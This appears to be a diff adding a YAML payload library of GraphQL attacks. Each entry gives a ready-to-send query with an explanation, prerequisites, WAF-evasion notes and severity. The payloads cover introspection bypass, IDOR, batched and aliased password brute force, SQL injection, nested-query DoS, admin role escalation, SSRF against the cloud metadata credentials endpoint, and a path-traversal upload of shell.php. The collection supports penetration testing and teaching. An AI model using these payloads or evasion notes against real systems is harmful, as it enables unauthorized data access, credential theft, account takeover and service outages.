@@ -1,0 +1,384 @@
+slug: graphql
+name: GraphQL Attacks
+owasp: A03:2021 – Injection
+description: 'GraphQL APIs introduce unique attack surfaces including introspection-based enumeration, batching attacks for
+  brute force, field injection for authorization bypass, nested query depth attacks for DoS, and directive abuse. Many GraphQL
+  implementations lack rate limiting and have overly permissive schemas that expose internal data.
+
+  '
+severity_range:
+  low: CVSS 4.3 – information disclosure via introspection
+  high: CVSS 9.1 – authorization bypass, data exfiltration, DoS
+references:
+- label: OWASP GraphQL Cheat Sheet
+  url: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
+- label: PortSwigger GraphQL API Attacks
+  url: https://portswigger.net/web-security/graphql
+groups:
+- slug: introspection-recon
+  name: Introspection and Schema Discovery
+  description: Using GraphQL introspection queries to enumerate schema, types, fields, and mutations
+  difficulty: low
+  prerequisites:
+  - GraphQL endpoint with introspection enabled
+  payloads:
+  - id: gql-intro-001
+    title: Full schema introspection query
+    payload_string: "query IntrospectionQuery {\n  __schema {\n    types { name kind fields { name type { name kind ofType\
+      \ { name kind } } } }\n    queryType { name }\n    mutationType { name }\n    subscriptionType { name }\n  }\n}\n"
+    how_it_works: 'GraphQL''s built-in introspection system allows clients to query the schema definition at runtime. The
+      __schema type exposes all types, fields, arguments, and directives. An attacker uses introspection to discover sensitive
+      types (User, Admin, Token), hidden mutations (deleteUser, resetPassword), and internal field names not documented publicly.
+      This reconnaissance step is essential for any GraphQL exploitation and should be disabled in production environments.
+
+      '
+    prerequisites:
+    - GraphQL introspection not disabled
+    waf_bypass_notes: Fragment introspection queries or send via POST with aliased field names
+    severity_context: CVSS 5.3 – complete API schema exposure enabling targeted attacks
+    cve_refs: []
+    tags:
+    - graphql
+    - introspection
+    - recon
+    - schema
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-intro-002
+    title: GraphQL field enumeration for hidden objects
+    payload_string: "{ __type(name: \"User\") {\n    name\n    fields { name description\n      args { name type { name kind\
+      \ ofType { name kind } } }\n    }\n  }\n}\n"
+    how_it_works: 'Even when the full schema query is blocked, individual type queries via __type may still be allowed. By
+      querying specific type names discovered through error messages or API documentation, an attacker can enumerate all fields
+      on that type. Hidden or undocumented fields like internalId, adminToken, passwordHash, or deleted flag may be discovered
+      this way, enabling targeted data extraction.
+
+      '
+    prerequisites:
+    - Partial introspection enabled or individual type queries allowed
+    waf_bypass_notes: Use __type per-query instead of full __schema if blocked
+    severity_context: CVSS 4.3 – field-level schema disclosure enabling targeted queries
+    cve_refs: []
+    tags:
+    - graphql
+    - introspection
+    - type-query
+    - recon
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-intro-003
+    title: GraphQL introspection bypass via fragment
+    payload_string: "fragment FullType on __Type {\n  kind name fields(includeDeprecated: true) {\n    name args { name type\
+      \ { ...TypeRef } }\n    type { ...TypeRef }\n  }\n}\nfragment TypeRef on __Type { kind name ofType { kind name ofType\
+      \ { kind name } } }\nquery { __schema { types { ...FullType } } }\n"
+    how_it_works: 'Some GraphQL implementations disable simple introspection queries but allow fragment-based introspection.
+      By spreading introspection types into fragments, the query structure becomes less obvious and may bypass naive keyword-based
+      blocking. Fragments allow the introspection to be spread across multiple reusable query components, potentially confusing
+      simple pattern-matching defenses.
+
+      '
+    prerequisites:
+    - Simple __schema introspection blocked but fragment-based allowed
+    waf_bypass_notes: Fragment spreading obfuscates introspection; combine with aliasing
+    severity_context: CVSS 4.3 – introspection bypass to obtain schema despite filtering
+    cve_refs: []
+    tags:
+    - graphql
+    - introspection
+    - fragment
+    - bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-intro-004
+    title: GraphQL error-based field name enumeration
+    payload_string: 'query { user { id email secretField nonExistentField } }
+
+      '
+    how_it_works: 'When introspection is disabled, GraphQL errors still reveal useful information. Querying for non-existent
+      fields typically returns an error like "Cannot query field ''nonExistentField'' on type ''User''. Did you mean ''internalNote''?"
+      The suggestions in GraphQL errors leak valid field names. An attacker iterates through a wordlist of common sensitive
+      field names, using error messages to confirm which fields exist.
+
+      '
+    prerequisites:
+    - GraphQL returns field suggestions in error messages
+    waf_bypass_notes: Error-based enumeration requires only legitimate query structure
+    severity_context: CVSS 4.3 – field name disclosure via GraphQL error messages
+    cve_refs: []
+    tags:
+    - graphql
+    - error-based
+    - enumeration
+    - field-discovery
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-intro-005
+    title: GraphQL directive enumeration
+    payload_string: "query { __schema {\n  directives { name locations args { name type { name kind } } }\n}}\n"
+    how_it_works: 'Custom GraphQL directives can reveal framework-specific functionality and authorization mechanisms. Directives
+      like @auth, @hasRole, @deprecated, or @internal expose authorization models. By enumerating directives, an attacker
+      learns what access control mechanisms exist and can look for ways to manipulate directive arguments or bypass directive-based
+      authorization.
+
+      '
+    prerequisites:
+    - GraphQL introspection enabled
+    - Custom authorization directives in use
+    waf_bypass_notes: Directive enumeration often overlooked in security testing
+    severity_context: CVSS 4.3 – authorization mechanism disclosure via directive enumeration
+    cve_refs: []
+    tags:
+    - graphql
+    - directives
+    - introspection
+    - authorization
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: graphql-injection
+  name: GraphQL Injection and Authorization Bypass
+  description: Injecting into GraphQL arguments, bypassing authorization, and IDOR via field arguments
+  difficulty: medium
+  prerequisites:
+  - GraphQL API with user-controlled arguments
+  payloads:
+  - id: gql-inject-001
+    title: GraphQL IDOR via direct ID argument
+    payload_string: 'query { user(id: 2) { id email role secretNotes creditCard } }
+
+      '
+    how_it_works: 'GraphQL resolvers that return objects based on ID arguments without checking whether the authenticated
+      user has permission to access that ID are vulnerable to IDOR. Unlike REST APIs where the URL structure may hide other
+      users'' IDs, GraphQL''s flexible query language makes it easy to directly request any object by its ID. An attacker
+      increments the ID parameter to access other users'' profiles, orders, or sensitive data.
+
+      '
+    prerequisites:
+    - GraphQL resolver fetches by ID without ownership check
+    - IDs are guessable (sequential integers or UUIDs from introspection)
+    waf_bypass_notes: GraphQL query structure; standard HTTP POST
+    severity_context: CVSS 8.1 – IDOR to access any user's data via GraphQL field arguments
+    tags:
+    - graphql
+    - idor
+    - authorization-bypass
+    - id-manipulation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-inject-002
+    title: GraphQL query batching for brute force
+    payload_string: "[\n  {\"query\": \"mutation { login(email: \\\"user@site.com\\\", password: \\\"password1\\\") { token\
+      \ } }\"},\n  {\"query\": \"mutation { login(email: \\\"user@site.com\\\", password: \\\"password2\\\") { token } }\"\
+      },\n  {\"query\": \"mutation { login(email: \\\"user@site.com\\\", password: \\\"password3\\\") { token } }\"}\n]\n"
+    how_it_works: 'GraphQL supports query batching where multiple queries are sent in a single HTTP request as a JSON array.
+      Rate limiting that triggers on HTTP request count (rather than query count) can be bypassed by batching hundreds of
+      password attempts in a single request. The server processes each query independently, attempting each password. An attacker
+      sends 100+ login attempts in a single request, bypassing per-request rate limits and account lockout thresholds that
+      count HTTP requests.
+
+      '
+    prerequisites:
+    - GraphQL server supports query batching
+    - Rate limiting based on HTTP request count
+    waf_bypass_notes: One HTTP request; may bypass IP-based rate limiting
+    severity_context: CVSS 7.5 – brute force / credential stuffing via batched queries
+    cve_refs: []
+    tags:
+    - graphql
+    - batching
+    - brute-force
+    - rate-limit-bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-inject-003
+    title: GraphQL SQL injection via argument
+    payload_string: 'query { searchUsers(name: "admin'' OR ''1''=''1") { id email } }
+
+      '
+    how_it_works: 'GraphQL resolvers that construct SQL queries using string concatenation with argument values are vulnerable
+      to SQL injection. Unlike REST APIs where parameters are often in URL query strings, GraphQL arguments are in the JSON
+      body and may not be subject to the same input validation. By injecting SQL in a GraphQL argument, an attacker exploits
+      the underlying database through the GraphQL layer.
+
+      '
+    prerequisites:
+    - GraphQL resolver uses string concatenation for SQL queries
+    - Argument value directly interpolated into SQL
+    waf_bypass_notes: SQL injection via JSON body in GraphQL; some WAFs miss this pattern
+    severity_context: CVSS 9.8 – SQL injection via GraphQL argument achieving database access
+    cve_refs: []
+    tags:
+    - graphql
+    - sqli
+    - injection
+    - argument
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-inject-004
+    title: GraphQL alias-based rate limit bypass
+    payload_string: "query {\n  a: login(email:\"user@x.com\", password:\"pass1\") { token }\n  b: login(email:\"user@x.com\"\
+      , password:\"pass2\") { token }\n  c: login(email:\"user@x.com\", password:\"pass3\") { token }\n}\n"
+    how_it_works: 'GraphQL aliases allow the same field to be queried multiple times in one request with different names.
+      Unlike array-based batching, aliases work in a single query document and are supported by all GraphQL servers. Rate
+      limiting on login attempts that counts mutations rather than HTTP requests may allow batched alias attacks depending
+      on implementation. Each alias triggers a separate resolver execution.
+
+      '
+    prerequisites:
+    - GraphQL allows multiple aliases to the same mutation
+    - Rate limiting does not count alias executions
+    waf_bypass_notes: Single query document with multiple aliases
+    severity_context: CVSS 7.5 – brute force via GraphQL alias batching
+    cve_refs: []
+    tags:
+    - graphql
+    - alias
+    - batching
+    - brute-force
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-inject-005
+    title: GraphQL nested query DoS (depth attack)
+    payload_string: "query {\n  user(id: 1) {\n    friends {\n      friends {\n        friends {\n          friends { id name\
+      \ email }\n        }\n      }\n    }\n  }\n}\n"
+    how_it_works: 'GraphQL allows arbitrarily nested queries, which can cause exponential resource consumption at the database
+      level. A deeply nested query on a many-to-many relationship (users → friends → their friends → their friends) can cause
+      O(n^depth) database queries. Without query depth limiting or cost analysis, a single request can exhaust server resources.
+      This is a DoS attack vector unique to GraphQL''s flexible query language.
+
+      '
+    prerequisites:
+    - GraphQL schema has circular or deeply nested relationships
+    - No query depth limiting configured
+    waf_bypass_notes: Single HTTP request; DoS via resource exhaustion, not volume
+    severity_context: CVSS 7.5 – server resource exhaustion via nested GraphQL query
+    cve_refs: []
+    tags:
+    - graphql
+    - dos
+    - depth-attack
+    - nested-query
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: graphql-mutation-abuse
+  name: Mutation Abuse and Business Logic
+  description: Exploiting GraphQL mutations for privilege escalation, data manipulation, and logic flaws
+  difficulty: medium
+  prerequisites:
+  - Access to GraphQL mutations
+  payloads:
+  - id: gql-mut-001
+    title: GraphQL role escalation via mutation field injection
+    payload_string: "mutation {\n  updateProfile(input: {\n    name: \"Attacker\"\n    role: \"admin\"\n    isActive: true\n\
+      \  }) { id name role }\n}\n"
+    how_it_works: 'GraphQL mutations with input types that expose privileged model fields allow direct privilege escalation.
+      If the updateProfile mutation''s InputType includes the role field (even if it''s not documented), an attacker can set
+      it to admin. GraphQL''s type system does not inherently restrict which fields are user-writable; that logic must be
+      implemented in resolvers. Missing field-level authorization in the resolver allows this attack.
+
+      '
+    prerequisites:
+    - Mutation input type includes privileged fields
+    - Resolver does not check authorization on role field write
+    waf_bypass_notes: Standard GraphQL mutation; field restriction must be at resolver level
+    severity_context: CVSS 9.8 – direct role escalation to admin via GraphQL mutation
+    cve_refs: []
+    tags:
+    - graphql
+    - mutation
+    - privilege-escalation
+    - role
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-mut-002
+    title: GraphQL subscription for real-time data harvesting
+    payload_string: "subscription {\n  messageCreated { id content sender { id email } recipient { id email } }\n}\n"
+    how_it_works: 'GraphQL subscriptions push real-time data to connected clients. If subscription authorization is weak (e.g.,
+      any authenticated user can subscribe to all messages), an attacker can subscribe to events they should not receive.
+      The subscription delivers other users'' private messages, transaction events, or security-sensitive notifications in
+      real time. This is a passive data collection attack that persists until the subscription is closed.
+
+      '
+    prerequisites:
+    - GraphQL subscriptions available
+    - Subscription lacks user-scoped authorization
+    waf_bypass_notes: WebSocket-based subscriptions may bypass HTTP WAF inspection
+    severity_context: CVSS 8.8 – real-time interception of other users' private data
+    cve_refs: []
+    tags:
+    - graphql
+    - subscription
+    - data-exfiltration
+    - real-time
+    - idor
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-mut-003
+    title: GraphQL server-side request forgery via URL argument
+    payload_string: "mutation {\n  importFromUrl(url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\
+      )\n  { result }\n}\n"
+    how_it_works: 'GraphQL mutations that accept URL arguments for fetching external resources (image imports, webhook registrations,
+      data imports) can be abused for SSRF. The server fetches the attacker-supplied URL, enabling access to internal network
+      resources, cloud metadata endpoints, and internal APIs. Since the request is made server-side, it bypasses network-level
+      restrictions that would block client-side requests.
+
+      '
+    prerequisites:
+    - GraphQL mutation accepts URL argument and makes server-side request
+    - No SSRF protection on URL validation
+    waf_bypass_notes: SSRF via GraphQL mutation; obfuscate URL with encoding or redirects
+    severity_context: CVSS 9.1 – SSRF via GraphQL URL argument reaching cloud metadata
+    cve_refs:
+    - CVE-2017-9506
+    tags:
+    - graphql
+    - ssrf
+    - mutation
+    - url-argument
+    - aws
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-mut-004
+    title: GraphQL file upload path traversal
+    payload_string: "mutation UploadFile($file: Upload!) {\n  uploadFile(file: $file, path: \"../../uploads/shell.php\") {\
+      \ url }\n}\n"
+    how_it_works: 'GraphQL mutations that handle file uploads and accept a destination path parameter are vulnerable to path
+      traversal. By supplying a path with ../ sequences, an attacker can write the uploaded file to arbitrary locations on
+      the server''s filesystem. If the server executes files in the web root, this achieves remote code execution. GraphQL''s
+      structured input format may make path traversal in this context less obvious than in REST form uploads.
+
+      '
+    prerequisites:
+    - GraphQL file upload mutation accepts a path/filename argument
+    - No path sanitization on destination
+    waf_bypass_notes: URL encode ../ as %2e%2e%2f; use backslashes on Windows targets
+    severity_context: CVSS 9.8 – arbitrary file write via path traversal in GraphQL upload
+    tags:
+    - graphql
+    - file-upload
+    - path-traversal
+    - rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: gql-mut-005
+    title: GraphQL N+1 query amplification attack
+    payload_string: "query {\n  posts {\n    id title\n    author { id\n      friends { id name orders { id total products\
+      \ { id name price } } }\n    }\n  }\n}\n"
+    how_it_works: 'The N+1 query problem in GraphQL occurs when resolvers are not batched using DataLoader. A query for N
+      posts triggers N author queries, each triggering M friend queries, each triggering order queries. This exponential amplification
+      can be deliberately triggered by an attacker to cause database exhaustion. Unlike the depth attack, this exploits the
+      breadth of relations across a single level, potentially triggering thousands of database queries from one request.
+
+      '
+    prerequisites:
+    - GraphQL resolvers not using DataLoader or query batching
+    - Many-to-many relationships in schema
+    waf_bypass_notes: Single request; resource exhaustion rather than request volume
+    severity_context: CVSS 7.5 – database exhaustion via N+1 query amplification
+    cve_refs: []
+    tags:
+    - graphql
+    - dos
+    - n-plus-one
+    - amplification
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
